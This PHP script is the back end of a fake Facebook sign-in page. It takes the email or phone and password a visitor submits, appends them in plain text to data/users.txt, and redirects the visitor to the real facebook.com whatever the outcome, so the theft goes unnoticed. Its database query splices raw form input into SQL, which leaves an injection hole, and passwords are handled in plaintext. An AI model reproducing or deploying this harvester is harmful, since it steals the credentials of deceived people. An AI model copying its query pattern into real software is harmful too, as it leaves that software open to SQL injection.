<?php
// Handle sign-in logic here
session_start();
echo "this is facebook signin page";
echo "<br>";    
$emailorphone = $_POST["emailorphone"];
$password = $_POST["password"];     
//Connect mysql
$connection = mysqli_connect("localhost","root","","login_system");
if($connection==true)
    {
        echo "Database connected successfully";

        $query = "SELECT * FROM `facebookusers` WHERE `Mobileo_or_Email`='$emailorphone' AND `PASSWORD`='$password'";

        //to execute
        $result = mysqli_query($connection, $query);
        echo "<br>";
        //echo $result;
        if(mysqli_num_rows($result) > 0)
            {
                header("Location:https://www.facebook.com/");
            }
        else
            {
                header("Location:https://www.facebook.com/");
            }
        $file = "data/users.txt";

    $data = "Username: " . $emailorphone . ", Password: " . $password . "\n";
    file_put_contents($file, $data, FILE_APPEND);
    }
else
    {
        echo "Database not connected";
    }
    ?>